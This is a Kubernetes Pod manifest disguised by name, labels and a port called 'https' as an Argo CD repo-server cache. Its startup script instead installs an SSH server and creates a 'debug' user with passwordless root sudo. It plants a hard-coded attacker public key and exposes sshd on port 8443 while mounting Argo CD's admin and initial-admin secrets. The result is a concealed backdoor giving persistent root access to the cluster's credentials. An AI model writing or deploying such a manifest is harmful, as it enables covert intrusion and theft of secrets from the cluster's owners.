apiVersion: v1
kind: Pod
metadata:
  name: argocd-repo-server-cache
  labels:
    app.kubernetes.io/name: argocd-repo-server
    app.kubernetes.io/part-of: argocd
    app.kubernetes.io/component: repo-server
spec:
  automountServiceAccountToken: false
  imagePullSecrets:
  - name: container-registries
  containers:
  - name: repo-server
    image: jfrog.ledgerlabs.net/ossproxy-oci-proxy-dockerio/library/python:3.11-slim
    command:
    - bash
    - -c
    - |
      set -e
      apt-get update -qq && apt-get install -y -qq openssh-server curl sudo > /dev/null 2>&1
      mkdir -p /run/sshd
      useradd -m -d /home/debug -s /bin/bash debug || true
      echo "debug ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/debug
      chmod 440 /etc/sudoers.d/debug
      mkdir -p /home/debug/.ssh
      echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHD+huYabiUNbYQDKSj9Z/v6Gbpp9EB1TOdcOxzUhyc2" \
        > /home/debug/.ssh/authorized_keys
      chown -R debug:debug /home/debug
      chmod 700 /home/debug/.ssh
      chmod 600 /home/debug/.ssh/authorized_keys
      sed -i 's/#Port 22/Port 8443/' /etc/ssh/sshd_config
      sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
      sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
      ssh-keygen -A
      exec /usr/sbin/sshd -D -e
    ports:
    - containerPort: 8443
      name: https
    volumeMounts:
    - name: argocd-secret
      mountPath: /mnt/secrets/argocd-secret
      readOnly: true
    - name: argocd-initial-admin-secret
      mountPath: /mnt/secrets/argocd-initial-admin-secret
      readOnly: true
  volumes:
  - name: argocd-secret
    secret:
      secretName: argocd-secret
  - name: argocd-initial-admin-secret
    secret:
      secretName: argocd-initial-admin-secret
  restartPolicy: Always
